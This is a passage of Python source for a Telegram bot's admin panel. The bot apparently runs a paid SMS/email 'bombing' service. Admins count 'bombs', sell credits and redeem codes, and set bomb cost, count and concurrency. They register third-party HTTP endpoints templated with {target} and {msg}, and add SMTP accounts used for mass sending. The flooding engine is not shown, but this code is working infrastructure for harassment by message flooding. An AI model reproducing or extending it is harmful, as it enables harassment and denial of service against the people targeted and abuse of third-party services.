         InlineKeyboardButton(text="⭐ VIP",           callback_data="a:vip")],
        [InlineKeyboardButton(text="📋 Logs",          callback_data="a:logs:0"),
         InlineKeyboardButton(text="📤 Export Users",  callback_data="a:export")],
        [InlineKeyboardButton(text="♻️ Reload services.json",
                              callback_data="a:reload_services")],
    ])


@dp.message(Command("admin"))
async def cmd_admin(m: types.Message, state: FSMContext):
    await state.clear()
    if not is_admin(m.from_user.id):
        return
    await m.answer("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:home")
async def cb_admin_home(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.clear()
    await c.message.edit_text("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())
    await c.answer()


@dp.callback_query(F.data == "a:reload_services")
async def cb_reload_services(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    n = load_services_json()
    await c.answer(f"loaded {n} new services", show_alert=True)


@dp.callback_query(F.data == "a:stats")
async def cb_stats(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    total   = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    banned  = _exec("SELECT COUNT(*) c FROM users WHERE banned=1", fetch="one")["c"]
    credits = _exec("SELECT COALESCE(SUM(credits),0) s FROM users", fetch="one")["s"]
    bombs   = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users", fetch="one")["s"]
    codes   = _exec("SELECT COUNT(*) c FROM redeem_codes WHERE active=1",
                    fetch="one")["c"]
    apis    = _exec("SELECT COUNT(*) c FROM apis WHERE active=1", fetch="one")["c"]
    apis_svc = _exec("SELECT COUNT(*) c FROM apis WHERE name LIKE 'svc:%'",
                     fetch="one")["c"]
    smtps   = _exec("SELECT COUNT(*) c FROM smtp_accounts WHERE active=1",
                    fetch="one")["c"]
    await c.message.edit_text(
        f"📊 <b>Stats</b>\n\n"
        f"👥 Users: <b>{total}</b> (banned {banned})\n"
        f"💳 Credits in circulation: <b>{credits}</b>\n"
        f"💥 Total bombs: <b>{bombs}</b>\n"
        f"🎁 Active codes: <b>{codes}</b>\n"
        f"🔌 Active APIs: <b>{apis}</b> (svc: {apis_svc})\n"
        f"📧 Active SMTP: <b>{smtps}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data.startswith("a:users:"))
async def cb_users(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    page = int(c.data.split(":")[2])
    per  = 10
    total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    max_page = max(0, (total - 1) // per)
    page = min(page, max_page)
    rows = _exec("SELECT * FROM users ORDER BY created_at DESC "
                 "LIMIT ? OFFSET ?", (per, page * per), fetch="all")
    lines = []
    for r in rows:
        flag = "🚫" if r["banned"] else "✅"
        lines.append(f"{flag} <code>{r['user_id']}</code> "
                     f"@{r['username'] or '-'} | 💳{r['credits']} | "
                     f"💥{r['total_bombs']}")
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️",
                                        callback_data=f"a:users:{page-1}"))
    if page < max_page:
        nav.append(InlineKeyboardButton(text="➡️",
                                        callback_data=f"a:users:{page+1}"))
    kb_rows = ([nav] if nav else []) + \
              [[InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]
    await c.message.edit_text(
        f"👥 <b>Users</b> (page {page+1}/{max_page+1})\n\n" +
        ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))
    await c.answer()


# ── Add Credits ──
@dp.callback_query(F.data == "a:add")
async def cb_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.add_credits_uid)
    await c.message.edit_text("➕ Send target <b>user_id</b> (or /cancel)")
    await c.answer()


@dp.message(AdminFSM.add_credits_uid)
async def fsm_add_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.add_credits_amt)
    await m.answer("Send amount")


@dp.message(AdminFSM.add_credits_amt)
async def fsm_add_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        amt = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    if not uid or not get_user(uid):
        await state.clear()
        return await m.answer("user not found")
    add_credits(uid, amt)
    log_action(m.from_user.id, "admin_add_credits", f"to={uid} amt={amt}")
    await state.clear()
    await m.answer(f"✅ added {amt} to <code>{uid}</code>. "
                   f"Balance: {get_user(uid)['credits']}",
                   reply_markup=admin_kb())
    try:
        await bot.send_message(uid, f"💳 +{amt} credits from admin.")
    except Exception:
        pass


# ── Deduct Credits ──
@dp.callback_query(F.data == "a:ded")
async def cb_ded(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.ded_credits_uid)
    await c.message.edit_text("➖ Send target <b>user_id</b> (or /cancel)")
    await c.answer()


@dp.message(AdminFSM.ded_credits_uid)
async def fsm_ded_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.ded_credits_amt)
    await m.answer("Send amount")


@dp.message(AdminFSM.ded_credits_amt)
async def fsm_ded_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        amt = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    u = get_user(uid) if uid else None
    if not u:
        await state.clear()
        return await m.answer("user not found")
    new = max(0, u["credits"] - amt)
    _exec("UPDATE users SET credits=? WHERE user_id=?", (new, uid))
    log_action(m.from_user.id, "admin_ded_credits", f"to={uid} amt={amt}")
    await state.clear()
    await m.answer(f"✅ deducted. Balance: {new}", reply_markup=admin_kb())


# ── Redeem ──
@dp.callback_query(F.data == "a:redeem")
async def cb_redeem(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM redeem_codes ORDER BY created_at DESC LIMIT 15",
                 fetch="all")
    lines = [f"<code>{r['code']}</code> | {r['amount']}c | "
             f"{r['used']}/{r['max_uses']} | "
             f"{'✅' if r['active'] else '🚫'}" for r in rows]
    await c.message.edit_text(
        "🎁 <b>Redeem Codes</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Create", callback_data="a:redeem_new")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:redeem_new")
async def cb_redeem_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.redeem_amount)
    await c.message.edit_text("🎁 Send credit amount per redeem (or /cancel)")
    await c.answer()


@dp.message(AdminFSM.redeem_amount)
async def fsm_redeem_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        amt = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    await state.update_data(amount=amt)
    await state.set_state(AdminFSM.redeem_uses)
    await m.answer("Send max uses (0 = unlimited)")


@dp.message(AdminFSM.redeem_uses)
async def fsm_redeem_uses(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        uses = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    if uses <= 0:
        uses = 10**9
    d = await state.get_data()
    code = gen_code(10)
    _exec("INSERT INTO redeem_codes(code,amount,max_uses,created_by,created_at) "
          "VALUES(?,?,?,?,?)",
          (code, d["amount"], uses, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "admin_create_code",
               f"{code} amt={d['amount']}")
    await state.clear()
    await m.answer(f"✅ created <code>{code}</code> "
                   f"({d['amount']}c, {uses} uses)",
                   reply_markup=admin_kb())


# ── APIs ──
@dp.callback_query(F.data == "a:apis")
async def cb_apis(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    active = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                   fetch="one")["c"]
    rows = _exec("SELECT * FROM apis ORDER BY id LIMIT 20", fetch="all")
    lines = []
    for r in rows:
        lines.append(
            f"#{r['id']} <b>{r['name']}</b> [{r['method']}] "
            f"{'✅' if r['active'] else '🚫'} "
            f"ok:{r['ok_count']} fail:{r['fail_count']}\n"
            f"  <code>{r['url'][:70]}</code>")
    await c.message.edit_text(
        f"🔌 <b>APIs</b> — {active}/{total} active\n\n" +
        ("\n".join(lines) or "none") +
        "\n\n<i>Showing first 20. Use /admin export for full list.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:api_new")],
            [InlineKeyboardButton(text="🗑 Del by ID", callback_data="a:api_del"),
             InlineKeyboardButton(text="🔁 Toggle", callback_data="a:api_tog")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:api_new")
async def cb_api_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.api_name)
    await c.message.edit_text("Send API name (or /cancel)")
    await c.answer()


@dp.message(AdminFSM.api_name)
async def fsm_api_name(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(name=m.text.strip())
    await state.set_state(AdminFSM.api_url)
    await m.answer("Send URL. Use {target} and {msg}.")


@dp.message(AdminFSM.api_url)
async def fsm_api_url(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(url=m.text.strip())
    await state.set_state(AdminFSM.api_method)
    await m.answer("Method: GET / POST / PUT")


@dp.message(AdminFSM.api_method)
async def fsm_api_method(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    meth = m.text.strip().upper()
    if meth not in ("GET", "POST", "PUT"):
        return await m.answer("GET / POST / PUT")
    await state.update_data(method=meth)
    await state.set_state(AdminFSM.api_body)
    await m.answer("Body (POST/PUT only, else '-')")


@dp.message(AdminFSM.api_body)
async def fsm_api_body(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(body="" if m.text.strip() == "-" else m.text.strip())
    await state.set_state(AdminFSM.api_headers)
    await m.answer("Headers one per line 'Key: Value' (or '-')")


@dp.message(AdminFSM.api_headers)
async def fsm_api_headers(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    headers = "" if m.text.strip() == "-" else m.text.strip()
    d = await state.get_data()
    _exec("INSERT INTO apis(name,channel,url,method,body,headers,created_at) "
          "VALUES(?,?,?,?,?,?,?)",
          (d["name"], "http", d["url"], d["method"], d["body"], headers,
           int(time.time())))
    log_action(m.from_user.id, "admin_add_api", d["name"])
    await state.clear()
    await m.answer("✅ API added", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:api_del")
async def cb_api_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="api_del")
    await c.message.edit_text("Send API ID to delete (or /cancel)")
    await c.answer()


@dp.callback_query(F.data == "a:api_tog")
async def cb_api_tog(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="api_tog")
    await c.message.edit_text("Send API ID to toggle (or /cancel)")
    await c.answer()


# ── SMTP ──
@dp.callback_query(F.data == "a:smtp")
async def cb_smtp(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM smtp_accounts ORDER BY id", fetch="all")
    lines = [f"#{r['id']} <code>{r['username']}</code> @ "
             f"{r['host']}:{r['port']} "
             f"{'✅' if r['active'] else '🚫'} "
             f"ok:{r['ok_count']} fail:{r['fail_count']}" for r in rows]
    await c.message.edit_text(
        "📧 <b>SMTP Accounts</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add SMTP", callback_data="a:smtp_new")],
            [InlineKeyboardButton(text="🗑 Del by ID", callback_data="a:smtp_del")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:smtp_new")
async def cb_smtp_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.smtp_host)
    await c.message.edit_text("SMTP host (e.g. smtp.gmail.com) or /cancel")
    await c.answer()


@dp.message(AdminFSM.smtp_host)
async def fsm_smtp_host(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(host=m.text.strip())
    await state.set_state(AdminFSM.smtp_port)
    await m.answer("Port (587 for TLS, 465 for SSL)")


@dp.message(AdminFSM.smtp_port)
async def fsm_smtp_port(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        port = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    await state.update_data(port=port)
    await state.set_state(AdminFSM.smtp_user)
    await m.answer("Username (full email for Gmail)")


@dp.message(AdminFSM.smtp_user)
async def fsm_smtp_user(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(username=m.text.strip())
    await state.set_state(AdminFSM.smtp_pass)
    await m.answer("Password / app password")


@dp.message(AdminFSM.smtp_pass)
async def fsm_smtp_pass(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.update_data(password=m.text.strip())
    await state.set_state(AdminFSM.smtp_name)
    await m.answer("From name (e.g. Support)")


@dp.message(AdminFSM.smtp_name)
async def fsm_smtp_name(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    d = await state.get_data()
    _exec("INSERT INTO smtp_accounts(host,port,username,password,from_name) "
          "VALUES(?,?,?,?,?)",
          (d["host"], d["port"], d["username"], d["password"], m.text.strip()))
    log_action(m.from_user.id, "admin_add_smtp", d["username"])
    await state.clear()
    await m.answer("✅ SMTP added", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:smtp_del")
async def cb_smtp_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="smtp_del")
    await c.message.edit_text("Send SMTP ID to delete (or /cancel)")
    await c.answer()


# ── Settings ──
@dp.callback_query(F.data == "a:settings")
async def cb_settings(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    keys = ["bomb_cost", "max_count", "cooldown", "concurrency",
            "daily_bonus", "referral_bonus", "maintenance"]
    txt = "⚙️ <b>Settings</b>\n\n" + "\n".join(
        f"{k}: <b>{setting(k)}</b>" for k in keys)
    rows = []
    for i in range(0, len(keys), 2):
        row = [InlineKeyboardButton(text=keys[i],
                                    callback_data=f"a:set:{keys[i]}")]
        if i + 1 < len(keys):
            row.append(InlineKeyboardButton(text=keys[i+1],
                                            callback_data=f"a:set:{keys[i+1]}"))
        rows.append(row)
    rows.append([InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")])
    await c.message.edit_text(txt,
                              reply_markup=InlineKeyboardMarkup(
                                  inline_keyboard=rows))
    await c.answer()


@dp.callback_query(F.data.startswith("a:set:"))
async def cb_set_edit(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    key = c.data.split(":", 2)[2]
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="setting", key=key)
    await c.message.edit_text(f"Send new value for <b>{key}</b> (or /cancel)")
    await c.answer()


@dp.message(AdminFSM.edit_setting)
async def fsm_edit_setting(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    d = await state.get_data()
    mode = d.get("mode")

    if mode == "setting":
        key = d.get("key")
        val = m.text.strip()
        numeric_keys = {"bomb_cost", "max_count", "cooldown", "concurrency",
                        "daily_bonus", "referral_bonus", "maintenance"}
        if key in numeric_keys:
            try:
                int(val)
            except ValueError:
                return await m.answer("numeric required")
        set_setting(key, val)
        await state.clear()
        return await m.answer(f"✅ {key} = {val}", reply_markup=admin_kb())

    if mode == "api_del":
        if not m.text.strip().isdigit():
            return await m.answer("numeric id")
        _exec("DELETE FROM apis WHERE id=?", (int(m.text.strip()),))
        await state.clear()
        return await m.answer("✅ deleted", reply_markup=admin_kb())

    if mode == "api_tog":
        if not m.text.strip().isdigit():
            return await m.answer("numeric id")
        _exec("UPDATE apis SET active = 1 - active, fail_streak=0 WHERE id=?",
              (int(m.text.strip()),))
        await state.clear()
        return await m.answer("✅ toggled", reply_markup=admin_kb())

    if mode == "smtp_del":
        if not m.text.strip().isdigit():
            return await m.answer("numeric id")
        _exec("DELETE FROM smtp_accounts WHERE id=?", (int(m.text.strip()),))
        await state.clear()
        return await m.answer("✅ deleted", reply_markup=admin_kb())

    if mode == "black_del":
        target = m.text.strip()
        _exec("DELETE FROM blacklist WHERE target=?", (target,))
        await state.clear()
        return await m.answer(f"✅ removed <code>{target}</code>",
                              reply_markup=admin_kb())

    await state.clear()
    return await m.answer("⚠️ state lost, reset. try again.",
                          reply_markup=admin_kb())


# ── Find user / ban ──
@dp.callback_query(F.data == "a:find")
async def cb_find(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.find_user)
    await c.message.edit_text("Send user_id (or /cancel)")
    await c.answer()


@dp.message(AdminFSM.find_user)
async def fsm_find(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    uid = int(m.text.strip())
    u = get_user(uid)
    if not u:
        return await m.answer("not found")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚫 Ban" if not u["banned"] else "✅ Unban",
                              callback_data=f"a:ban:{uid}")],
        [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]])
    await m.answer(
        f"👤 <code>{uid}</code>\n"
        f"@{u['username'] or '-'} | {u['first_name']}\n"
        f"💳 {u['credits']} | 💥 {u['total_bombs']}\n"
        f"⭐ vip cost: {u['vip_cost']}\n"
        f"Status: {'🚫 banned' if u['banned'] else '✅ active'}",
        reply_markup=kb)
    await state.clear()


@dp.callback_query(F.data.startswith("a:ban:"))
async def cb_ban(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    uid = int(c.data.split(":")[2])
    _exec("UPDATE users SET banned = 1 - banned WHERE user_id=?", (uid,))
    log_action(c.from_user.id, "admin_toggle_ban", str(uid))
    await c.answer("toggled", show_alert=True)


# ── Broadcast ──
@dp.callback_query(F.data == "a:bcast")
async def cb_bcast(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.broadcast)
    await c.message.edit_text("Send broadcast message (or /cancel)")
    await c.answer()


@dp.message(AdminFSM.broadcast)
async def fsm_bcast(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    await state.clear()
    asyncio.create_task(_do_broadcast(m))


async def _do_broadcast(m: types.Message):
    users = _exec("SELECT user_id FROM users WHERE banned=0", fetch="all")
    sent = failed = 0
    status = await m.answer(f"📢 Broadcasting to {len(users)} users...")
    for row in users:
        try:
            await bot.send_message(row["user_id"], m.html_text)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)
    try:
        await status.edit_text(
            f"✅ Broadcast done. Sent {sent}, failed {failed}")
    except Exception:
        pass
    log_action(m.from_user.id, "admin_broadcast",
               f"sent={sent} failed={failed}")


# ── Blacklist ──
@dp.callback_query(F.data == "a:black")
async def cb_black(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM blacklist ORDER BY added_at DESC LIMIT 30",
                 fetch="all")
    lines = [f"• <code>{r['target']}</code>" for r in rows]
    await c.message.edit_text(
        "🚫 <b>Blacklist</b>\n\n" + ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:black_add")],
            [InlineKeyboardButton(text="🗑 Remove", callback_data="a:black_del")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:black_add")
async def cb_black_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.blacklist_add)
    await c.message.edit_text("Send target to blacklist (or /cancel)")
    await c.answer()


@dp.message(AdminFSM.blacklist_add)
async def fsm_black_add(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    t = m.text.strip()
    _exec("INSERT OR IGNORE INTO blacklist(target,added_by,added_at) "
          "VALUES(?,?,?)", (t, m.from_user.id, int(time.time())))
    await state.clear()
    await m.answer(f"✅ blacklisted <code>{t}</code>", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:black_del")
async def cb_black_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="black_del")
    await c.message.edit_text("Send target to remove (or /cancel)")
    await c.answer()


# ── VIP ──
@dp.callback_query(F.data == "a:vip")
async def cb_vip(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.vip_uid)
    await c.message.edit_text("⭐ Send user_id to set VIP cost (or /cancel)")
    await c.answer()


@dp.message(AdminFSM.vip_uid)
async def fsm_vip_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    if not m.text.strip().isdigit():
        return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.vip_cost)
    await m.answer("Send VIP cost (0 to reset to default)")


@dp.message(AdminFSM.vip_cost)
async def fsm_vip_cost(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    if m.text.startswith("/"):
        return await state.clear()
    try:
        cost = int(m.text.strip())
    except ValueError:
        return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    if not get_user(uid):
        await state.clear()
        return await m.answer("user not found")
    _exec("UPDATE users SET vip_cost=? WHERE user_id=?", (cost, uid))
    await state.clear()
    await m.answer(f"✅ vip cost for <code>{uid}</code> = {cost}",
                   reply_markup=admin_kb())


# ── Logs ──
@dp.callback_query(F.data.startswith("a:logs:"))
async def cb_logs(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    page = int(c.data.split(":")[2])
    per = 15
    total = _exec("SELECT COUNT(*) c FROM logs", fetch="one")["c"]
    max_page = max(0, (total - 1) // per)
    page = min(page, max_page)
    rows = _exec("SELECT * FROM logs ORDER BY ts DESC LIMIT ? OFFSET ?",
                 (per, page * per), fetch="all")
    lines = []
    for r in rows:
        t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
        lines.append(f"{t} <code>{r['user_id']}</code> {r['action']} "
                     f"{r['detail'][:40]}")
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️",
                                        callback_data=f"a:logs:{page-1}"))
    if page < max_page:
        nav.append(InlineKeyboardButton(text="➡️",
                                        callback_data=f"a:logs:{page+1}"))
    kb_rows = ([nav] if nav else []) + \
              [[InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]
    await c.message.edit_text(
        f"📋 <b>Logs</b> (page {page+1}/{max_page+1})\n\n" +
        ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))
    await c.answer()


# ── Export ──
@dp.callback_query(F.data == "a:export")
async def cb_export(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM users", fetch="all")
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["user_id", "username", "first_name", "credits", "banned",
                "total_bombs", "ref_count", "vip_cost", "created_at"])
    for r in rows:
        w.writerow([r["user_id"], r["username"], r["first_name"], r["credits"],
                    r["banned"], r["total_bombs"], r["ref_count"],
                    r["vip_cost"], r["created_at"]])
    data = buf.getvalue().encode()
    await c.message.answer_document(
        BufferedInputFile(data, filename="users.csv"),
        caption=f"📤 {len(rows)} users exported")
    await c.answer()


# ─────────────────────────── HEALTH SERVER ───────────────────────────
async def _health_handler(request):
    return aiohttp.web.Response(
        text="Bot is running",
        content_type="text/plain",
        status=200)


async def _run_health_server():
    app = aiohttp.web.Application()
    app.router.add_get("/", _health_handler)
    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    site = aiohttp.web.TCPSite(runner, host="0.0.0.0", port=PORT)
    await site.start()
    log.info("health server listening on 0.0.0.0:%d", PORT)
    try:
        await asyncio.Event().wait()
    finally:
        await runner.cleanup()
        log.info("health server stopped")


# ─────────────────────────── STARTUP ───────────────────────────
async def _periodic_prune():
    while True:
        try:
            prune_logs()
        except Exception:
            log.exception("prune failed")
        await asyncio.sleep(6 * 3600)


async def main():
    init_db()
    load_services_json()          # seed/upsert services.json endpoints
    log.info("bot starting | admins=%s | port=%d", ADMIN_IDS, PORT)
    await bot.delete_webhook(drop_pending_updates=True)

    prune_task  = asyncio.create_task(_periodic_prune())
    health_task = asyncio.create_task(_run_health_server())

    try:
        await dp.start_polling(bot)
    finally:
        for t in (health_task, prune_task):
            if t and not t.done():
                t.cancel()
        for t in (health_task, prune_task):
            try:
                await t
            except (asyncio.CancelledError, Exception):
                pass
        try:
            await bot.session.close()
        except Exception:
            pass
        try:
            _conn.close()
        except Exception:
            pass
        log.info("shutdown complete")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("interrupted")